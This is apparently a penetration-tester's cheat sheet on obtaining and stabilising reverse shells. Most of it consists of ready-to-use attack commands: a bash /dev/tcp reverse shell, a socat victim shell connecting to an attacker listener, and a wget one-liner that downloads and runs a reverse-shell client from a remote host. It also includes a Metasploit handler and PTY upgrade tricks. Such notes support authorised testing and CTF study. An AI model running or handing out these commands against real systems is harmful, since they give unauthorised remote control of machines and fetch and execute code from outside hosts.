# Shells and Stabilization

---

## Reverse Shell Hints

If a shell does not work for any reason, try wrapping it into a bash command
with `-c`:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.49.131/80 0>&1'
bash -c '/tmp/client <Attack IP>:22'
```

**Important:** Always check other ports if default ones don't work!

---

## Shell Upgrade Techniques

### Basic Bash Upgrade

This can improve functionality but may be killed depending on the pty:

```bash
SHELL=/bin/bash script -q /dev/null
```

### Python PTY Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## socat Shells

### Attacker (Listener)

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Victim

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

---

## Complete Shell Stabilization Process

### Step 1: Get Basic PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 2: Background and Configure Terminal

```bash
# Press Ctrl+Z to background the shell
stty raw -echo  # Run this in your attacking terminal
fg              # Bring shell back to foreground
reset           # Reset terminal emulation
```

### Step 3: Configure Environment

```bash
export SHELL=bash
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
alias ll='ls -lsaht --color=auto'
stty columns 200 rows 200  # Adjust to your terminal size
```

---

## Additional Tools and Tricks

### VI Sudo Trick

Save a file with sudo privileges from within vi:

```bash
:w !sudo tee %
```

### RSSH Common Shell

Download and run a reverse shell client:

```bash
wget -O /tmp/client http://10.10.16.20/client_x64 && chmod +x /tmp/client && /tmp/client -d 10.10.16.20:443
```

### Metasploit Handler Setup

```bash
msfconsole -x 'use multi/handler; setg LHOST tun0; setg LPORT 444'
```

### SSH Agent Configuration

```bash
eval `ssh-agent`
ssh-add <key.pem>
```

### Windows PATH Setup

```bash
set PATH=%SystemRoot%\system32;%SystemRoot%;
```
